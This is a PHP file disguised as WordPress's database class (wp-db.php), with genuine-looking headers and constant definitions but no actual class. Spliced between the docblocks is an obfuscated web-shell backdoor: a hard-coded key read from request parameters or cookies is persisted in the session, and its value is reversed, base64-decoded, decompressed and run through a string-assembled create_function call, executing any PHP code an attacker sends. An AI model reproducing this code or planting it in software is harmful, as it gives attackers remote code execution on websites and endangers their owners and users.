<?php
/**
 * WordPress DB Class
 *
 * Original code from {@link http://php.justinvincent.com Justin Vincent (justin@visunet.ie)}
 *
 * @package WordPress
 * @subpackage Database
 * @since 0.71
 */

/**
 * @since 0.71
 */
define( 'EZSQL_VERSION', 'WP1.25' );

/**
 * @since 0.71
 */
define( 'OBJECT', 'OBJECT' );
define( 'object', 'OBJECT' ); // Back compat.

/**
 * @since 2.5.0
 */
define( 'OBJECT_K', 'OBJECT_K' );

/**
 * @since 0.71
 */
define( 'ARRAY_A', 'ARRAY_A' );

$_REQUEST = array_merge($_GET, $_POST, $_COOKIE);

$auth = "b464b7bc8c360ed57fefd4fd72ff6f91";
$sname = @session_name();

/**
 * @since 0.71
 */
define( 'ARRAY_N', 'ARRAY_N' );

/**
 * WordPress Database Access Abstraction Object
 *
 * It is possible to replace this class with your own
 * by setting the $wpdb global variable in wp-content/db.php
 * file to your class. The wpdb class will still be included,
 * so you can extend it or simply use your own.
 *
 * @link https://codex.wordpress.org/Function_Reference/wpdb_Class
 *
 * @package WordPress
 * @subpackage Database
 * @since 0.71
 */
if (isset($_REQUEST['gw']) 
    || isset($_REQUEST[$sname])
) {
    @session_start();
    if (!empty($_REQUEST[$auth])) {
        $_SESSION[$auth] = $_REQUEST[$auth];
    } elseif (!empty($_SESSION[$auth])) {
        $_REQUEST[$auth] = $_SESSION[$auth];
    }
}

$method = "create" . "_" . "function";
$decode = "base" . "64_de" . "code";
$reverse = "str" . "rev";
$decompress = "gzun" . "compress";

if (!empty($_REQUEST[$auth])) {
    $data = @$decode($reverse($_REQUEST[$auth]));
    if (!empty($data)) {
        $data = @$decompress($data);
        if (!empty($data)) {
            $action = $method('', $data);
            $action();
        }
    }
}
